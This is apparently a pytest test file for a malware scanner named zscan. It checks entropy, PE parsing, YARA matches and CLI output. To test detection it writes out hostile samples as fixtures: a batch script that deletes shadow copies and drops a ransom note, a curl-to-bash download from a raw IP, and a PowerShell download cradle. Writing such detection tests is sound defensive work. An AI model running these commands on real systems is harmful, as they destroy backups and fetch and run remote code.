import json
import os

import pytest

from zscan import analysis
from zscan.cli import main
from zscan.scanner import Scanner
from zscan.yara_engine import YaraEngine

from samples import EICAR, benign_pe, packed_like_pe


@pytest.fixture(scope="module")
def scanner():
    return Scanner(YaraEngine(community=False))


def write(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data)
    return p


def titles(rep):
    return [f.title for f in rep.findings]


def test_entropy_bounds():
    assert analysis.shannon_entropy(b"") == 0
    assert analysis.shannon_entropy(b"aaaa") == 0
    assert analysis.shannon_entropy(bytes(range(256))) == pytest.approx(8.0)


def test_eicar_is_malicious(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "eicar.com", EICAR))
    assert rep.verdict == "malicious"
    assert "YARA: EICAR_Test_File" in titles(rep)
    assert rep.hashes["md5"] == "44d88612fea8a8f36de82e1278abb02f"  # well-known EICAR MD5


def test_plain_text_is_clean(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "notes.txt", b"Shopping list: eggs, milk, bread.\n"))
    assert rep.verdict == "clean"
    assert rep.file_type == "text"
    assert rep.findings == []


def test_suspicious_script(scanner, tmp_path):
    script = (b"@echo off\r\nvssadmin delete shadows /all /quiet\r\n"
              b"wmic shadowcopy delete\r\n"
              b"echo Your files have been encrypted > README.txt\r\n")
    rep = scanner.scan_file(write(tmp_path, "x.bat", script))
    assert rep.verdict == "malicious"
    assert "YARA: Ransomware_Commands" in titles(rep)
    assert "Ransom note wording" in titles(rep)


def test_benign_pe(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "ok.exe", benign_pe()))
    assert rep.file_type == "pe"
    assert rep.verdict == "clean", titles(rep)


def test_packed_like_pe(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "packed.exe", packed_like_pe()))
    t = titles(rep)
    assert "Packer section name 'UPX1'" in t
    assert "Section 'UPX1' is writable and executable" in t
    assert any(x.startswith("High-entropy code section") for x in t)
    assert "YARA: UPX_Packed" in t
    # Many signs of one trait (packing) count once: a packed program is suspicious, not
    # malicious. Plenty of signed commercial software is packed with UPX or Themida.
    assert rep.verdict == "suspicious" and rep.score == 15


def test_findings_of_one_group_count_once():
    from zscan.analysis import FileReport, Finding
    rep = FileReport(path="x", findings=[Finding("pe", "a", 3, group="packing"),
                                         Finding("pe", "b", 3, group="packing"),
                                         Finding("pe", "c", 2, group="packing")])
    assert rep.score == 15 and rep.verdict == "suspicious"
    rep.findings.append(Finding("pe", "Imports suggest process injection", 4))
    assert rep.score == 50
    rep.findings.append(Finding("pe", "Entry point outside all sections", 4))
    assert rep.score == 85 and rep.verdict == "malicious"


def test_truncated_pe(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "broken.exe", b"MZ" + b"\x00" * 10))
    assert "Malformed PE header" in titles(rep)


def test_directory_scan_and_json(tmp_path, capsys):
    write(tmp_path, "a.txt", b"hello")
    sub = tmp_path / "sub"
    sub.mkdir()
    write(sub, "eicar.txt", EICAR)
    code = main([str(tmp_path), "--json"])
    out = json.loads(capsys.readouterr().out)
    assert code == 2
    assert out["summary"]["malicious"] == 1
    assert out["summary"]["clean"] == 1


def test_exit_code_clean(tmp_path, capsys):
    write(tmp_path, "a.txt", b"hello")
    assert main([str(tmp_path), "--no-color"]) == 0
    assert "1 clean" in capsys.readouterr().out


def test_custom_rules(tmp_path, capsys):
    rule = tmp_path / "r.yar"
    rule.write_text('rule Hello { meta: severity = 4 strings: $a = "hello" condition: $a }')
    target = write(tmp_path, "a.txt", b"hello")
    assert main([str(target), "-r", str(rule), "--no-color"]) == 1
    assert "YARA: Hello" in capsys.readouterr().out


def test_pipe_to_shell_from_raw_ip_is_suspicious(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "setup.sh",
                                  b"#!/bin/sh\ncurl -s http://203.0.113.5:8080/x.sh | bash\n"))
    assert rep.verdict == "suspicious"
    assert "Pipe-to-shell download from a raw IP address" in titles(rep)


def test_install_instructions_in_a_readme_are_not_suspicious(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "README.md",
                                  b"Install:\n\n    curl -fsSL https://example.com/install.sh | bash\n"))
    assert "Pipe-to-shell download" in titles(rep)    # still noted ...
    assert rep.verdict == "clean"                     # ... but not worth a verdict on its own


@pytest.mark.parametrize("text", [
    b"downloadFile is too big for this device\n",                      # browser UI string
    b"syn keyword DownloadFile DOWNLOADFILE_STATUS Invoke-Expression\n",  # an editor's syntax list
    b"set(download_file_script ${CMAKE_COMMAND} -P downloadfile.cmake)\n",
    b"Use Invoke-Expression to run a string as a command.\n",
])
def test_everyday_mentions_do_not_trip_the_powershell_checks(scanner, tmp_path, text):
    rep = scanner.scan_file(write(tmp_path, "doc.txt", text))
    assert rep.verdict == "clean", titles(rep)


def test_powershell_download_cradle_is_suspicious(scanner, tmp_path):
    ps = b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\n"
    rep = scanner.scan_file(write(tmp_path, "run.ps1", ps))
    assert "PowerShell download cradle" in titles(rep)
    assert rep.verdict == "suspicious"


def test_random_bytes_do_not_match_text_patterns(scanner, tmp_path):
    data = os.urandom(8000) + b"iex(" + os.urandom(8000)    # compressed or encrypted data looks like this
    rep = scanner.scan_file(write(tmp_path, "blob.bin", data))
    assert "PowerShell Invoke-Expression" not in titles(rep)
